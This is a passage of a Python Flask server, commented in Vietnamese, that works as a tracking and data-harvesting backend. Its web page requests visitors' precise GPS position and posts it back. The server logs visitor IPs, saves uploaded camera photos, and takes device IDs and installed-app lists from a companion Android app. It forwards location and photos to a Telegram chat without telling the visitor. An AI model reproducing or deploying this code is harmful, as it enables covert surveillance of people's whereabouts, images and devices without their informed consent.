"""
server.py - Server lấy IP + GPS + Ảnh + App List + IP Router + Google Maps Link
Port: 9999
Chạy: python server.py
"""

from flask import Flask, request, jsonify, send_from_directory
from datetime import datetime
import os
import sys
import json
import socket
import base64
import subprocess
import re
import urllib.request
import urllib.parse
import threading

# ═══════════════════════════════════════════════════════════════════════
#  CẤU HÌNH
# ═══════════════════════════════════════════════════════════════════════
CONFIG = {
    'HOST': '0.0.0.0',
    'PORT': 9999,
    'LOG_FILE': 'visitors.log',
    'PHOTO_DIR': 'photos',
    'REPORT_DIR': 'reports',
    'ENABLE_COLOR': True,
    'ENABLE_GEO': True,
    'ENABLE_VPN_CHECK': True,
    'BLOCK_VPN': True,
    'BLOCK_PROXY': True,
    'RISK_THRESHOLD': 33,
    'CACHE_TIME': 3600,
    'ENABLE_CAMERA': True,
    'ENABLE_GPS': True,
    'TELEGRAM_BOT_TOKEN': '',
    'TELEGRAM_CHAT_ID': '',
}

if sys.platform == 'win32':
    os.system('')

class C:
    GREEN='\033[92m'; YELLOW='\033[93m'; CYAN='\033[96m'; RED='\033[91m'
    MAGENTA='\033[95m'; BLUE='\033[94m'; WHITE='\033[97m'
    BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

def clr(text, color):
    return f"{color}{text}{C.RESET}" if CONFIG['ENABLE_COLOR'] else str(text)


app = Flask(__name__)
for d in [CONFIG['PHOTO_DIR'], CONFIG['REPORT_DIR']]:
    os.makedirs(d, exist_ok=True)
_vpn_cache = {}


# ═══════════════════════════════════════════════════════════════════════
#  GOOGLE MAPS LINK
# ═══════════════════════════════════════════════════════════════════════
def google_maps_link(lat, lon):
    """Tạo link Google Maps"""
    return f"https://www.google.com/maps?q={lat},{lon}"


def google_maps_link_full(lat, lon, label=""):
    """Link Google Maps với label"""
    if label:
        return f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
    return f"https://www.google.com/maps?q={lat},{lon}&z=18"


def google_maps_embed(lat, lon):
    """Link nhúng bản đồ Google Maps (không cần API key)"""
    return f"https://maps.google.com/maps?q={lat},{lon}&z=16&output=embed"


# ═══════════════════════════════════════════════════════════════════════
#  LẤY IP ROUTER + IP LAN
# ═══════════════════════════════════════════════════════════════════════
def get_router_ip():
    try:
        if sys.platform == 'win32':
            result = subprocess.run(['ipconfig'], capture_output=True,
                                    text=True, timeout=5,
                                    encoding='utf-8', errors='ignore')
            match = re.search(r'Default Gateway[^\:]*:\s*(\d+\.\d+\.\d+\.\d+)',
                              result.stdout)
            if match:
                return match.group(1)
    except:
        pass
    return None


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'


def get_mac_address():
    try:
        if sys.platform == 'win32':
            result = subprocess.run(['getmac', '/v', '/fo', 'csv'],
                                    capture_output=True, text=True, timeout=5)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                for line in lines[1:]:
                    parts = line.split(',')
                    if len(parts) >= 3:
                        mac = parts[2].strip('"')
                        if mac and mac not in ('N/A', 'Disabled'):
                            return mac
    except:
        pass
    return None


# ═══════════════════════════════════════════════════════════════════════
#  TELEGRAM
# ═══════════════════════════════════════════════════════════════════════
def send_telegram_text(msg):
    if not CONFIG['TELEGRAM_BOT_TOKEN'] or not CONFIG['TELEGRAM_CHAT_ID']:
        return
    def _send():
        try:
            url = f"https://api.telegram.org/bot{CONFIG['TELEGRAM_BOT_TOKEN']}/sendMessage"
            data = urllib.parse.urlencode({
                'chat_id': CONFIG['TELEGRAM_CHAT_ID'],
                'text': msg, 'parse_mode': 'HTML',
                'disable_web_page_preview': 'false',
            }).encode()
            urllib.request.urlopen(url, data=data, timeout=10)
        except:
            pass
    threading.Thread(target=_send, daemon=True).start()


def send_telegram_location(lat, lon):
    if not CONFIG['TELEGRAM_BOT_TOKEN'] or not CONFIG['TELEGRAM_CHAT_ID']:
        return
    def _send():
        try:
            url = f"https://api.telegram.org/bot{CONFIG['TELEGRAM_BOT_TOKEN']}/sendLocation"
            data = urllib.parse.urlencode({
                'chat_id': CONFIG['TELEGRAM_CHAT_ID'],
                'latitude': lat, 'longitude': lon,
            }).encode()
            urllib.request.urlopen(url, data=data, timeout=10)
        except:
            pass
    threading.Thread(target=_send, daemon=True).start()


def send_telegram_photo(photo_path, caption):
    if not CONFIG['TELEGRAM_BOT_TOKEN'] or not CONFIG['TELEGRAM_CHAT_ID']:
        return
    def _send():
        try:
            with open(photo_path, 'rb') as f:
                photo_data = f.read()
            boundary = '----WebKitFormBoundary' + os.urandom(16).hex()
            body = b''
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            body += f"{CONFIG['TELEGRAM_CHAT_ID']}\r\n".encode()
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="caption"\r\n\r\n'
            body += f"{caption}\r\n".encode()
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n'
            body += b'HTML\r\n'
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="photo"; filename="photo.jpg"\r\n'
            body += b'Content-Type: image/jpeg\r\n\r\n'
            body += photo_data + b'\r\n'
            body += f'--{boundary}--\r\n'.encode()
            url = f"https://api.telegram.org/bot{CONFIG['TELEGRAM_BOT_TOKEN']}/sendPhoto"
            req = urllib.request.Request(url, data=body)
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            urllib.request.urlopen(req, timeout=30)
        except:
            pass
    threading.Thread(target=_send, daemon=True).start()


# ═══════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════
def get_real_ip():
    for h in ['CF-Connecting-IP', 'True-Client-IP', 'X-Real-IP',
              'X-Client-IP', 'X-Forwarded-For', 'Forwarded']:
        val = request.headers.get(h)
        if val:
            ip = val.split(',')[0].strip()
            if ip.startswith('['):
                ip = ip.split(']')[0].strip('[')
            if ip and ip not in ('unknown', 'null'):
                return ip, h
    return request.remote_addr or 'Unknown', 'REMOTE_ADDR'


def is_local_ip(ip):
    if ip in ('127.0.0.1', 'localhost', '::1', 'Unknown'):
        return True
    if ip.startswith(('192.168.', '10.', '172.16.', '172.17.', '172.18.',
                      '172.19.', '172.2', '172.30.', '172.31.', '169.254.',
                      'fc', 'fd')):
        return True
    return False


def get_geo(ip):
    if is_local_ip(ip):
        return {}
    try:
        url = f'http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,regionName,isp,org,as,lat,lon,timezone'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
            return data if data.get('status') == 'success' else {}
    except:
        return {}


def check_vpn(ip):
    if is_local_ip(ip):
        return {'is_vpn': False, 'is_proxy': False, 'is_tor': False,
                'risk': 0, 'type': 'local', 'provider': ''}
    now = datetime.now().timestamp()
    if ip in _vpn_cache:
        cached, ts = _vpn_cache[ip]
        if now - ts < CONFIG['CACHE_TIME']:
            return cached
    result = {'is_vpn': False, 'is_proxy': False, 'is_tor': False,
              'risk': 0, 'type': 'unknown', 'provider': ''}
    try:
        url = f'https://proxycheck.io/v2/{ip}?vpn=1&asn=1&risk=1'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as r:
            data = json.loads(r.read().decode())
            if ip in data:
                info = data[ip]
                ptype = str(info.get('type', '')).lower()
                result['risk'] = int(info.get('risk', 0))
                result['provider'] = info.get('provider', '')
                result['type'] = info.get('type', '')
                if str(info.get('proxy', '')).lower() == 'yes':
                    result['is_proxy'] = True
                if 'vpn' in ptype: result['is_vpn'] = True
                if 'tor' in ptype: result['is_tor'] = True
    except:
        pass
    _vpn_cache[ip] = (result, now)
    return result


def should_block(vpn):
    if CONFIG['BLOCK_VPN'] and vpn.get('is_vpn'): return True, 'VPN'
    if CONFIG['BLOCK_PROXY'] and vpn.get('is_proxy'): return True, 'Proxy'
    if vpn.get('risk', 0) >= CONFIG['RISK_THRESHOLD']:
        return True, f"Risk cao ({vpn['risk']}/100)"
    return False, ''


def print_to_cmd(ip, source, geo, vpn, blocked, reason, path):
    now = datetime.now().strftime('%H:%M:%S')
    W = 74
    border = C.RED if blocked else C.GREEN
    router_ip = get_router_ip()
    local_ip = get_local_ip()
    
    print()
    if blocked:
        print(clr('╔' + '═' * W + '╗', C.RED))
        print(clr('║', C.RED) + clr(f' 🚫 CHẶN TRUY CẬP  [{now}]', C.BOLD + C.WHITE) + 
              ' ' * (W - 22) + clr('║', C.RED))
    else:
        print(clr('╔' + '═' * W + '╗', C.GREEN))
        print(clr('║', C.GREEN) + clr(f' ✅ TRUY CẬP HỢP LỆ  [{now}]', C.BOLD + C.WHITE) + 
              ' ' * (W - 25) + clr('║', C.GREEN))
    
    print(clr('╠' + '═' * W + '╣', border))
    line = f" {clr('👤 IP người truy cập:', C.YELLOW)} {clr(ip, C.WHITE + C.BOLD)}"
    print(clr('║', border) + line + ' ' * (W - len(f" 👤 IP người truy cập: {ip}") - 1) + clr('║', border))
    
    src = f"   └─ Header: {source}"
    print(clr('║', border) + clr(src.ljust(W - 1), C.DIM) + clr('║', border))
    
    if geo and geo.get('status') == 'success':
        rows = [
            ('🏳️  Quốc gia', f"{geo.get('country', '?')} ({geo.get('countryCode', '?')})"),
            ('🏙️  Thành phố', geo.get('city', '?')),
            ('📡 Nhà mạng', geo.get('isp', '?')),
        ]
        for lbl, val in rows:
            line = f" {clr(lbl + ':', C.YELLOW)} {val[:50]}"
            print(clr('║', border) + line + ' ' * max(W - len(f" {lbl}: {val[:50]}") - 1, 1) + clr('║', border))
    
    if blocked:
        line = f" {clr('🚨 LÝ DO CHẶN:', C.RED + C.BOLD)} {reason}"
        print(clr('║', border) + line + ' ' * max(W - len(f" 🚨 LÝ DO CHẶN: {reason}") - 1, 1) + clr('║', border))
    
    print(clr('╠' + '─' * W + '╣', border))
    print(clr('║', border) + clr(' 🖥️  MÁY CHỦ', C.CYAN + C.BOLD).ljust(W + 10) + clr('║', border))
    
    router_display = router_ip or 'N/A'
    line = f" {clr('📶 IP Router:', C.YELLOW)} {clr(router_display, C.GREEN + C.BOLD)}"
    print(clr('║', border) + line + ' ' * (W - len(f" 📶 IP Router: {router_display}") - 1) + clr('║', border))
    
    line = f" {clr('💻 IP LAN:   ', C.YELLOW)} {clr(local_ip, C.CYAN)}"
    print(clr('║', border) + line + ' ' * (W - len(f" 💻 IP LAN:    {local_ip}") - 1) + clr('║', border))
    
    mac = get_mac_address()
    if mac:
        line = f" {clr('🔖 MAC:      ', C.YELLOW)} {clr(mac, C.DIM)}"
        print(clr('║', border) + line + ' ' * max(W - len(f" 🔖 MAC:       {mac}") - 1, 1) + clr('║', border))
    
    print(clr('╠' + '─' * W + '╣', border))
    req = f" ► {request.method} {path}"
    print(clr('║', border) + clr(req.ljust(W - 1), C.CYAN) + clr('║', border))
    print(clr('╚' + '═' * W + '╝', border))
    print()


# ═══════════════════════════════════════════════════════════════════════
#  MIDDLEWARE
# ═══════════════════════════════════════════════════════════════════════
@app.before_request
def log_every_request():
    if request.path in ('/favicon.ico',):
        return None
    
    ip, source = get_real_ip()
    if is_local_ip(ip):
        return None
    
    vpn = check_vpn(ip)
    blocked, reason = should_block(vpn)
    geo = get_geo(ip)
    
    print_to_cmd(ip, source, geo, vpn, blocked, reason, request.path)
    
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    router_ip = get_router_ip()
    status = 'BLOCKED' if blocked else 'OK'
    line = (f"[{now}] [{status}] IP={ip} | Router={router_ip} | "
            f"ISP={geo.get('isp','?')} | {request.path}")
    try:
        with open(CONFIG['LOG_FILE'], 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except:
        pass
    
    if blocked:
        return blocked_page(ip, reason, vpn), 403
    return None


# ═══════════════════════════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════════════════════════
@app.route('/')
def index():
    ip, _ = get_real_ip()
    geo = get_geo(ip)
    ip_lat = geo.get('lat', 0)
    ip_lon = geo.get('lon', 0)
    router_ip = get_router_ip()
    local_ip = get_local_ip()
    
    # Google Maps link từ IP
    ip_gmaps = google_maps_link(ip_lat, ip_lon) if ip_lat and ip_lon else '#'
    
    return f'''<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thông tin của bạn</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            font-family: -apple-system, 'Segoe UI', Roboto, Arial;
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh; padding: 20px;
            display: flex; align-items: center; justify-content: center;
        }}
        .card {{
            background: #fff; border-radius: 20px; padding: 30px;
            max-width: 520px; width: 100%;
            box-shadow: 0 25px 70px rgba(0,0,0,0.3);
        }}
        h1 {{ color: #1f2937; margin-bottom: 20px; text-align: center; font-size: 22px; }}
        h2 {{
            color: #4f46e5; margin: 22px 0 12px 0; font-size: 16px;
            padding-bottom: 8px; border-bottom: 2px solid #e5e7eb;
        }}
        .ip {{
            background: linear-gradient(135deg, #10b981, #059669);
            color: #fff; font-size: 24px; font-weight: 700;
            padding: 18px; border-radius: 12px; text-align: center;
            margin-bottom: 20px; font-family: monospace; word-break: break-all;
            box-shadow: 0 8px 20px rgba(16,185,129,0.4);
        }}
        .info {{ display: grid; gap: 8px; }}
        .row {{
            display: flex; justify-content: space-between;
            padding: 11px 15px; background: #f9fafb;
            border-radius: 9px; border-left: 4px solid #10b981; font-size: 14px;
        }}
        .row.gps {{ border-left-color: #f59e0b; background: #fffbeb; }}
        .row.router {{ border-left-color: #3b82f6; background: #eff6ff; }}
        .label {{ color: #6b7280; font-weight: 500; }}
        .value {{
            color: #111827; font-weight: 700;
            font-family: monospace; text-align: right;
            max-width: 60%; word-break: break-all;
        }}
        #map {{
            height: 280px; border-radius: 12px;
            margin-top: 15px; border: 2px solid #e5e7eb;
        }}
        .status {{
            padding: 12px; border-radius: 10px;
            margin: 15px 0; font-size: 14px;
            font-weight: 600; text-align: center;
        }}
        .status.waiting {{ background: #fef3c7; color: #d97706; }}
        .status.success {{ background: #d1fae5; color: #059669; }}
        .status.denied {{ background: #fee2e2; color: #dc2626; }}
        .status.ip {{ background: #dbeafe; color: #2563eb; }}
        
        /* Nút Google Maps */
        .gmaps-btn {{
            display: inline-flex; align-items: center; justify-content: center;
            gap: 10px; width: 100%; margin-top: 12px;
            padding: 14px 20px;
            background: linear-gradient(135deg, #4285F4, #34A853);
            color: #fff; text-decoration: none;
            border-radius: 12px; font-weight: 700; font-size: 15px;
            transition: all 0.3s; box-shadow: 0 6px 15px rgba(66,133,244,0.4);
            border: none; cursor: pointer;
        }}
        .gmaps-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(66,133,244,0.6);
        }}
        .gmaps-btn:active {{ transform: translateY(0); }}
        .gmaps-icon {{
            width: 22px; height: 22px;
            background: #fff; border-radius: 4px;
            display: flex; align-items: center; justify-content: center;
            font-size: 14px; color: #4285F4; font-weight: bold;
        }}
        .gmaps-link-text {{
            background: #f3f4f6; padding: 10px 12px;
            border-radius: 8px; margin-top: 10px;
            font-family: monospace; font-size: 11px;
            color: #4285F4; word-break: break-all;
            border-left: 4px solid #4285F4;
        }}
    </style>
</head>
<body>
    <div class="card">
        <h1>📍 Thông tin của bạn</h1>
        <div class="ip">{ip}</div>
        
        <h2>🌐 Thông tin mạng</h2>
        <div class="info">
            <div class="row"><span class="label">🏳️ Quốc gia</span>
                <span class="value">{geo.get('country', '?')}</span></div>
            <div class="row"><span class="label">🏙️ Thành phố</span>
                <span class="value">{geo.get('city', '?')}</span></div>
            <div class="row"><span class="label">📡 Nhà mạng</span>
                <span class="value">{geo.get('isp', '?')}</span></div>
        </div>
        
        <div id="status" class="status waiting">📡 Đang xin quyền vị trí...</div>
        
        <h2>📍 Vị trí GPS</h2>
        <div class="info">
            <div class="row gps"><span class="label">Vĩ độ</span>
                <span class="value" id="lat">Đang chờ...</span></div>
            <div class="row gps"><span class="label">Kinh độ</span>
                <span class="value" id="lon">Đang chờ...</span></div>
            <div class="row gps"><span class="label">Độ chính xác</span>
                <span class="value" id="acc">Đang chờ...</span></div>
        </div>
        
        <div id="map"></div>
        
        <!-- NÚT GOOGLE MAPS -->
        <a id="gmapsBtn" class="gmaps-btn" 
           href="{ip_gmaps}" target="_blank" rel="noopener">
            <span class="gmaps-icon">G</span>
            <span id="gmapsBtnText">🗺️ Mở Google Maps (từ IP)</span>
        </a>
        
        <div class="gmaps-link-text" id="gmapsLink">
            {ip_gmaps}
        </div>
        
        <h2>🖥️ Máy chủ</h2>
        <div class="info">
            <div class="row router"><span class="label">📶 IP Router</span>
                <span class="value">{router_ip or 'N/A'}</span></div>
            <div class="row router"><span class="label">💻 IP LAN</span>
                <span class="value">{local_ip}</span></div>
        </div>
    </div>
    
    <script>
    const IP_LAT = {ip_lat}, IP_LON = {ip_lon};
    
    function setStatus(text, type) {{
        const s = document.getElementById('status');
        s.textContent = text;
        s.className = 'status ' + type;
    }}
    
    let map = L.map('map').setView([IP_LAT || 10.8231, IP_LON || 106.6297], 12);
    L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{
        attribution: '© OpenStreetMap'
    }}).addTo(map);
    
    let marker = null;
    function updateMap(lat, lon, popup) {{
        map.setView([lat, lon], 16);
        if (marker) map.removeLayer(marker);
        marker = L.marker([lat, lon]).addTo(map).bindPopup(popup).openPopup();
    }}
    
    // Cập nhật nút Google Maps
    function updateGoogleMapsLink(lat, lon) {{
        const url = `https://www.google.com/maps?q=${{lat}},${{lon}}&z=18`;
        document.getElementById('gmapsBtn').href = url;
        document.getElementById('gmapsBtnText').textContent = '🗺️ Mở Google Maps (GPS chính xác)';
        document.getElementById('gmapsLink').textContent = url;
    }}
    
    function getLocation() {{
        if (!navigator.geolocation) {{
            setStatus('❌ Trình duyệt không hỗ trợ GPS', 'denied');
            return;
        }}
        navigator.geolocation.getCurrentPosition(
            (pos) => {{
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                
                document.getElementById('lat').textContent = lat.toFixed(6);
                document.getElementById('lon').textContent = lon.toFixed(6);
                document.getElementById('acc').textContent = '±' + acc.toFixed(0) + 'm';
                
                setStatus('✅ Đã lấy vị trí GPS chính xác', 'success');
                updateMap(lat, lon, `<b>Vị trí của bạn</b><br>±${{acc.toFixed(0)}}m`);
                updateGoogleMapsLink(lat, lon);
                
                fetch('/api/location', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ lat, lon, accuracy: acc }})
                }}).catch(e => console.error(e));
            }},
            (err) => {{
                let msg = err.code === 1 ? '🚫 Bạn đã từ chối quyền vị trí' : '📡 Không lấy được GPS';
                setStatus(msg + ' — Dùng vị trí từ IP', 'ip');
                if (IP_LAT && IP_LON) {{
                    document.getElementById('lat').textContent = IP_LAT + ' (IP)';
                    document.getElementById('lon').textContent = IP_LON + ' (IP)';
                    document.getElementById('acc').textContent = '~5-50 km';
                    updateMap(IP_LAT, IP_LON, '<b>Vị trí ước lượng từ IP</b>');
                }}
            }},
            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
        );
    }}
    
    window.addEventListener('load', () => setTimeout(getLocation, 500));
    </script>
</body>
</html>'''


@app.route('/api/location', methods=['POST'])
def api_location():
    try:
        data = request.get_json()
        lat, lon = data.get('lat'), data.get('lon')
        acc = data.get('accuracy', 0)
        
        if lat is None or lon is None:
            return jsonify({'error': 'Missing coordinates'}), 400
        
        ip, _ = get_real_ip()
        geo = get_geo(ip)
        now = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        router_ip = get_router_ip()
        gmaps = google_maps_link(lat, lon)
        
        W = 74
        print()
        print(clr('╔' + '═' * W + '╗', C.YELLOW))
        print(clr('║', C.YELLOW) + clr(f' 📍 ĐÃ LẤY TỌA ĐỘ GPS  [{datetime.now().strftime("%H:%M:%S")}]', C.BOLD + C.WHITE) + ' ' * 27 + clr('║', C.YELLOW))
        print(clr('╠' + '═' * W + '╣', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 👤 IP người dùng: {clr(ip, C.GREEN + C.BOLD)}".ljust(84) + clr('║', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 📍 Vĩ độ:         {clr(str(lat), C.CYAN + C.BOLD)}".ljust(84) + clr('║', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 📍 Kinh độ:       {clr(str(lon), C.CYAN + C.BOLD)}".ljust(84) + clr('║', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 🎯 Độ chính xác:  ±{acc:.0f}m".ljust(84) + clr('║', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 🗺️  Google Maps:   {clr(gmaps, C.BLUE + C.BOLD)}".ljust(105) + clr('║', C.YELLOW))
        print(clr('╠' + '─' * W + '╣', C.YELLOW))
        print(clr('║', C.YELLOW) + f" 📶 IP Router:     {clr(router_ip or 'N/A', C.GREEN + C.BOLD)}".ljust(84) + clr('║', C.YELLOW))
        print(clr('╚' + '═' * W + '╝', C.YELLOW))
        
        with open(CONFIG['LOG_FILE'], 'a', encoding='utf-8') as f:
            f.write(f"[{now}] [GPS] IP={ip} | Router={router_ip} | "
                    f"Lat={lat} | Lon={lon} | Acc=±{acc:.0f}m | Maps={gmaps}\n")
        
        caption = (
            f"📍 <b>VỊ TRÍ NGƯỜI TRUY CẬP</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📌 <b>Tọa độ:</b> <code>{lat}, {lon}</code>\n"
            f"🎯 <b>Độ chính xác:</b> ±{acc:.0f}m\n"
            f"🏳️ <b>Quốc gia:</b> {geo.get('country', '?')}\n"
            f"🏙️ <b>Thành phố:</b> {geo.get('city', '?')}\n"
            f"📡 <b>ISP:</b> {geo.get('isp', '?')}\n"
            f"📶 <b>Router:</b> <code>{router_ip or 'N/A'}</code>\n"
            f"⏰ <b>Thời gian:</b> {now}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🗺️ <a href='{gmaps}'>MỞ GOOGLE MAPS</a>"
        )
        send_telegram_text(caption)
        send_telegram_location(lat, lon)
        
        return jsonify({
            'status': 'ok',
            'gmaps': gmaps,
            'coords': {'lat': lat, 'lon': lon},
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/capture', methods=['POST'])
def api_capture():
    try:
        data = request.get_json()
        if not data or 'photo' not in data:
            return jsonify({'error': 'No photo'}), 400
        
        ip, _ = get_real_ip()
        geo = get_geo(ip)
        
        b64 = data['photo']
        if ',' in b64:
            b64 = b64.split(',')[1]
        img_bytes = base64.b64decode(b64)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_ip = ip.replace('.', '_').replace(':', '_')
        filename = f"{timestamp}_{safe_ip}.jpg"
        filepath = os.path.join(CONFIG['PHOTO_DIR'], filename)
        with open(filepath, 'wb') as f:
            f.write(img_bytes)
        
        now = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        router_ip = get_router_ip()
        W = 74
        
        print()
        print(clr('╔' + '═' * W + '╗', C.MAGENTA))
        print(clr('║', C.MAGENTA) + clr(f' 📸 ĐÃ CHỤP ẢNH  [{datetime.now().strftime("%H:%M:%S")}]', C.BOLD + C.WHITE) + ' ' * 37 + clr('║', C.MAGENTA))
        print(clr('╠' + '═' * W + '╣', C.MAGENTA))
        print(clr('║', C.MAGENTA) + f" 👤 IP người dùng: {clr(ip, C.GREEN + C.BOLD)}".ljust(84) + clr('║', C.MAGENTA))
        print(clr('║', C.MAGENTA) + f" 📷 File:          {clr(filename, C.CYAN)}".ljust(84) + clr('║', C.MAGENTA))
        print(clr('║', C.MAGENTA) + f" 📶 IP Router:     {clr(router_ip or 'N/A', C.GREEN + C.BOLD)}".ljust(84) + clr('║', C.MAGENTA))
        print(clr('╚' + '═' * W + '╝', C.MAGENTA))
        
        caption = (
            f"📸 <b>Ảnh người truy cập</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"🏳️ <b>Quốc gia:</b> {geo.get('country', '?')}\n"
            f"🏙️ <b>Thành phố:</b> {geo.get('city', '?')}\n"
            f"📶 <b>Router:</b> <code>{router_ip or 'N/A'}</code>\n"
            f"⏰ <b>Thời gian:</b> {now}"
        )
        send_telegram_photo(filepath, caption)
        
        return jsonify({'status': 'ok', 'file': filename})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/report', methods=['POST'])
def api_report():
    """Nhận báo cáo từ APK Java"""
    try:
        data = request.get_json()
        ip, _ = get_real_ip()
        geo = get_geo(ip)
        now = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        router_ip = get_router_ip()
        local_ip = get_local_ip()
        
        device = data.get('device', {})
        location = data.get('location', {})
        apps = data.get('apps', [])
        total = data.get('total_apps', 0)
        user_apps = [a for a in apps if a.get('is_user')]
        system_apps = [a for a in apps if a.get('is_system')]
        
        lat = location.get('lat', 0)
        lon = location.get('lon', 0)
        acc = location.get('accuracy', 0)
        
        # Google Maps link
        gmaps = google_maps_link(lat, lon) if lat and lon else 'N/A'
        
        W = 74
        print()
        print(clr('╔' + '═' * W + '╗', C.GREEN))
        print(clr('║', C.GREEN) + clr(f' 📊 BÁO CÁO THIẾT BỊ  [{datetime.now().strftime("%H:%M:%S")}]', C.BOLD + C.WHITE) + ' ' * 26 + clr('║', C.GREEN))
        print(clr('╠' + '═' * W + '╣', C.GREEN))
        
        print(clr('║', C.GREEN) + clr(' 👤 NGƯỜI DÙNG', C.YELLOW + C.BOLD).ljust(W + 10) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   🌐 IP:        {clr(ip, C.WHITE + C.BOLD)}".ljust(84) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   🏳️  Quốc gia:  {geo.get('country', '?')}".ljust(84) + clr('║', C.GREEN))
        
        print(clr('╠' + '─' * W + '╣', C.GREEN))
        print(clr('║', C.GREEN) + clr(' 📱 THIẾT BỊ', C.YELLOW + C.BOLD).ljust(W + 10) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   📱 Máy:       {device.get('manufacturer','?')} {device.get('model','?')}".ljust(84) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   🤖 Android:   {device.get('android_version','?')} (SDK {device.get('sdk','?')})".ljust(84) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   🔑 DeviceID:  {device.get('device_id','?')[:40]}".ljust(84) + clr('║', C.GREEN))
        
        if lat and lon:
            print(clr('╠' + '─' * W + '╣', C.GREEN))
            print(clr('║', C.GREEN) + clr(' 📍 VỊ TRÍ GPS', C.YELLOW + C.BOLD).ljust(W + 10) + clr('║', C.GREEN))
            print(clr('║', C.GREEN) + f"   📌 Tọa độ:    {location.get('lat')}, {location.get('lon')}".ljust(84) + clr('║', C.GREEN))
            print(clr('║', C.GREEN) + f"   🎯 Độ CX:     ±{location.get('accuracy', 0):.0f}m".ljust(84) + clr('║', C.GREEN))
            print(clr('║', C.GREEN) + f"   🗺️  Maps:      {clr(gmaps, C.BLUE + C.BOLD)}".ljust(105) + clr('║', C.GREEN))
        
        print(clr('╠' + '─' * W + '╣', C.GREEN))
        print(clr('║', C.GREEN) + clr(' 🖥️  MÁY CHỦ', C.CYAN + C.BOLD).ljust(W + 10) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   📶 IP Router: {clr(router_ip or 'N/A', C.GREEN + C.BOLD)}".ljust(84) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   💻 IP LAN:    {clr(local_ip, C.CYAN)}".ljust(84) + clr('║', C.GREEN))
        
        print(clr('╠' + '─' * W + '╣', C.GREEN))
        print(clr('║', C.GREEN) + clr(f' 📦 DANH SÁCH APP ({total} app)', C.YELLOW + C.BOLD).ljust(W + 10) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   👤 App người dùng: {clr(str(len(user_apps)), C.CYAN + C.BOLD)}".ljust(88) + clr('║', C.GREEN))
        print(clr('║', C.GREEN) + f"   ⚙️  App hệ thống:   {clr(str(len(system_apps)), C.DIM)}".ljust(88) + clr('║', C.GREEN))
        print(clr('╠' + '─' * W + '╣', C.GREEN))
        
        for i, a in enumerate(user_apps[:15]):
            name = a.get('name', '?')[:45]
            print(clr('║', C.GREEN) + f"   {i+1:2d}. {clr(name, C.WHITE)}".ljust(84) + clr('║', C.GREEN))
        
        if len(user_apps) > 15:
            print(clr('║', C.GREEN) + f"       ... và {len(user_apps) - 15} app khác".ljust(84) + clr('║', C.GREEN))
        
        print(clr('╚' + '═' * W + '╝', C.GREEN))
        
        # Lưu file
        safe_ip = ip.replace('.', '_').replace(':', '_')
        filename = f"{CONFIG['REPORT_DIR']}/{safe_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump({
                'ip': ip, 'geo': geo, 'device': device,
                'location': location, 'apps': apps,
                'router_ip': router_ip, 'local_ip': local_ip,
                'gmaps': gmaps, 'time': now,
            }, f, ensure_ascii=False, indent=2)
        
        # Telegram
